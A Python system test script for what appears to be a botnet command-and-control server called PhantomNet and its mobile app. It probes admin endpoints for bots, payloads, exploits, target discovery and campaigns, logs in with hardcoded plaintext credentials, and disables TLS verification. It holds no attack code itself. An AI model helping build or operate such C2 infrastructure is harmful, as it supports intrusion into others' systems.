#!/usr/bin/env python3
"""
Complete System Test for PhantomNet C2 Server & Mobile App
This script tests the entire system to ensure everything works seamlessly
"""

import os
import sys
import time
import json
import requests
import subprocess
import threading
from pathlib import Path
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SystemTester:
    def __init__(self):
        self.base_url = "https://localhost:8443"
        self.session_token = None
        self.test_results = {}
        
    def print_status(self, message, status="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "RESET": "\033[0m"
        }
        print(f"{colors.get(status, '')}[{status}]{colors['RESET']} {message}")
    
    def test_server_startup(self):
        """Test if the server can start properly"""
        self.print_status("Testing server startup...", "INFO")
        
        try:
            # Check if server is already running
            response = requests.get(f"{self.base_url}/admin/dashboard", verify=False, timeout=5)
            if response.status_code in [200, 401, 302]:
                self.print_status("Server is already running", "SUCCESS")
                return True
        except:
            pass
        
        # Try to start the server
        try:
            server_script = Path("start_server.py")
            if server_script.exists():
                self.print_status("Starting server with start_server.py...", "INFO")
                # Start server in background
                process = subprocess.Popen([sys.executable, "start_server.py"], 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE)
                
                # Wait for server to start
                for i in range(30):  # Wait up to 30 seconds
                    try:
                        response = requests.get(f"{self.base_url}/admin/dashboard", verify=False, timeout=2)
                        if response.status_code in [200, 401, 302]:
                            self.print_status("Server started successfully", "SUCCESS")
                            return True
                    except:
                        pass
                    time.sleep(1)
                
                self.print_status("Server failed to start within 30 seconds", "ERROR")
                return False
            else:
                self.print_status("start_server.py not found", "ERROR")
                return False
                
        except Exception as e:
            self.print_status(f"Failed to start server: {e}", "ERROR")
            return False
    
    def test_server_endpoints(self):
        """Test all server endpoints"""
        self.print_status("Testing server endpoints...", "INFO")
        
        endpoints_to_test = [
            ("/admin/dashboard", "GET", False),
            ("/admin/login", "POST", False),
            ("/admin/logout", "POST", True),
            ("/admin/stats", "GET", True),
            ("/admin/bots", "GET", True),
            ("/admin/commands", "POST", True),
            ("/admin/payloads", "GET", True),
            ("/admin/payloads", "POST", True),
            ("/admin/targets", "GET", True),
            ("/admin/targets/discover", "POST", True),
            ("/admin/campaigns", "GET", True),
            ("/admin/campaigns", "POST", True),
            ("/admin/tasks", "GET", True),
            ("/admin/exploits", "GET", True),
            ("/admin/duckdns/update", "POST", True),
            ("/admin/duckdns/toggle", "POST", True),
        ]
        
        success_count = 0
        total_count = len(endpoints_to_test)
        
        for endpoint, method, requires_auth in endpoints_to_test:
            try:
                if method == "GET":
                    response = requests.get(f"{self.base_url}{endpoint}", verify=False, timeout=5)
                elif method == "POST":
                    response = requests.post(f"{self.base_url}{endpoint}", verify=False, timeout=5)
                
                # Accept 200, 401 (unauthorized), 405 (method not allowed) as valid
                if response.status_code in [200, 401, 405]:
                    self.print_status(f"✓ {endpoint} - OK", "SUCCESS")
                    success_count += 1
                else:
                    self.print_status(f"✗ {endpoint} - Status: {response.status_code}", "WARNING")
                    
            except Exception as e:
                self.print_status(f"✗ {endpoint} - Error: {e}", "ERROR")
        
        self.print_status(f"Endpoints test: {success_count}/{total_count} passed", 
                         "SUCCESS" if success_count >= total_count * 0.8 else "WARNING")
        return success_count >= total_count * 0.8
    
    def test_authentication(self):
        """Test authentication flow"""
        self.print_status("Testing authentication...", "INFO")
        
        try:
            # Test login
            login_data = {
                "username": "wappafloppa",
                "password": "Stelz17@"
            }
            
            response = requests.post(
                f"{self.base_url}/admin/login",
                json=login_data,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'session_token' in data:
                    self.session_token = data['session_token']
                    self.print_status("✓ Login successful", "SUCCESS")
                    return True
                else:
                    self.print_status("✗ No session token in response", "ERROR")
                    return False
            else:
                self.print_status(f"✗ Login failed - Status: {response.status_code}", "ERROR")
                return False
                
        except Exception as e:
            self.print_status(f"✗ Authentication test failed: {e}", "ERROR")
            return False
    
    def test_authenticated_endpoints(self):
        """Test endpoints that require authentication"""
        if not self.session_token:
            self.print_status("No session token available", "WARNING")
            return False
        
        self.print_status("Testing authenticated endpoints...", "INFO")
        
        headers = {
            'Authorization': f'Bearer {self.session_token}',
            'Content-Type': 'application/json'
        }
        
        endpoints_to_test = [
            "/admin/stats",
            "/admin/bots",
            "/admin/payloads",
            "/admin/targets",
            "/admin/campaigns",
            "/admin/tasks",
            "/admin/exploits"
        ]
        
        success_count = 0
        for endpoint in endpoints_to_test:
            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.print_status(f"✓ {endpoint} - OK", "SUCCESS")
                    success_count += 1
                else:
                    self.print_status(f"✗ {endpoint} - Status: {response.status_code}", "WARNING")
                    
            except Exception as e:
                self.print_status(f"✗ {endpoint} - Error: {e}", "ERROR")
        
        self.print_status(f"Authenticated endpoints: {success_count}/{len(endpoints_to_test)} passed", 
                         "SUCCESS" if success_count >= len(endpoints_to_test) * 0.8 else "WARNING")
        return success_count >= len(endpoints_to_test) * 0.8
    
    def test_mobile_app_dependencies(self):
        """Test if mobile app dependencies are properly installed"""
        self.print_status("Testing mobile app dependencies...", "INFO")
        
        mobile_dir = Path("phantomnet-mobile")
        if not mobile_dir.exists():
            self.print_status("Mobile app directory not found", "ERROR")
            return False
        
        package_json = mobile_dir / "package.json"
        if not package_json.exists():
            self.print_status("package.json not found", "ERROR")
            return False
        
        # Check if node_modules exists
        node_modules = mobile_dir / "node_modules"
        if not node_modules.exists():
            self.print_status("node_modules not found - run 'npm install' in phantomnet-mobile", "WARNING")
            return False
        
        self.print_status("✓ Mobile app dependencies look good", "SUCCESS")
        return True
    
    def test_database_initialization(self):
        """Test if database is properly initialized"""
        self.print_status("Testing database initialization...", "INFO")
        
        try:
            # Test if we can get stats (which requires database)
            response = requests.get(f"{self.base_url}/admin/stats", verify=False, timeout=5)
            if response.status_code in [200, 401]:
                self.print_status("✓ Database is accessible", "SUCCESS")
                return True
            else:
                self.print_status(f"✗ Database test failed - Status: {response.status_code}", "ERROR")
                return False
        except Exception as e:
            self.print_status(f"✗ Database test failed: {e}", "ERROR")
            return False
    
    def test_file_structure(self):
        """Test if all required files exist"""
        self.print_status("Testing file structure...", "INFO")
        
        required_files = [
            "phantomnet-c2/phantomnet/app.py",
            "phantomnet-c2/phantomnet/server.py",
            "phantomnet-c2/phantomnet/models.py",
            "phantomnet-c2/phantomnet/config.py",
            "phantomnet-c2/phantomnet/routes/api.py",
            "phantomnet-c2/phantomnet/routes/admin.py",
            "phantomnet-c2/phantomnet/routes/bot.py",
            "phantomnet-c2/requirements.txt",
            "phantomnet-mobile/App.tsx",
            "phantomnet-mobile/src/contexts/AuthContext.tsx",
            "phantomnet-mobile/src/navigation/AppNavigator.tsx",
            "phantomnet-mobile/src/services/api.ts",
            "phantomnet-mobile/src/screens/auth/LoginScreen.tsx",
            "phantomnet-mobile/package.json",
        ]
        
        missing_files = []
        for file_path in required_files:
            if not Path(file_path).exists():
                missing_files.append(file_path)
        
        if missing_files:
            self.print_status(f"✗ Missing files: {missing_files}", "ERROR")
            return False
        else:
            self.print_status("✓ All required files exist", "SUCCESS")
            return True
    
    def run_all_tests(self):
        """Run all tests and provide a comprehensive report"""
        self.print_status("Starting comprehensive system test...", "INFO")
        self.print_status("=" * 60, "INFO")
        
        tests = [
            ("File Structure", self.test_file_structure),
            ("Server Startup", self.test_server_startup),
            ("Database Initialization", self.test_database_initialization),
            ("Server Endpoints", self.test_server_endpoints),
            ("Authentication", self.test_authentication),
            ("Authenticated Endpoints", self.test_authenticated_endpoints),
            ("Mobile App Dependencies", self.test_mobile_app_dependencies),
        ]
        
        results = {}
        for test_name, test_func in tests:
            self.print_status(f"\nRunning {test_name} test...", "INFO")
            try:
                result = test_func()
                results[test_name] = result
                self.print_status(f"{test_name}: {'PASSED' if result else 'FAILED'}", 
                                "SUCCESS" if result else "ERROR")
            except Exception as e:
                self.print_status(f"{test_name}: ERROR - {e}", "ERROR")
                results[test_name] = False
        
        # Summary
        self.print_status("\n" + "=" * 60, "INFO")
        self.print_status("TEST SUMMARY", "INFO")
        self.print_status("=" * 60, "INFO")
        
        passed = sum(1 for result in results.values() if result)
        total = len(results)
        
        for test_name, result in results.items():
            status = "PASSED" if result else "FAILED"
            color = "SUCCESS" if result else "ERROR"
            self.print_status(f"{test_name}: {status}", color)
        
        self.print_status(f"\nOverall: {passed}/{total} tests passed", 
                         "SUCCESS" if passed == total else "WARNING")
        
        if passed == total:
            self.print_status("\n🎉 ALL TESTS PASSED! System is ready for use.", "SUCCESS")
            self.print_status("\nNext steps:", "INFO")
            self.print_status("1. Start the server: python start_server.py", "INFO")
            self.print_status("2. Start mobile app: cd phantomnet-mobile && npm start", "INFO")
            self.print_status("3. Login with: wappafloppa / Stelz17@", "INFO")
        else:
            self.print_status(f"\n⚠️  {total - passed} tests failed. Please fix the issues above.", "WARNING")
        
        return passed == total

def main():
    """Main function"""
    print("PhantomNet C2 Server & Mobile App - Complete System Test")
    print("=" * 60)
    
    tester = SystemTester()
    success = tester.run_all_tests()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
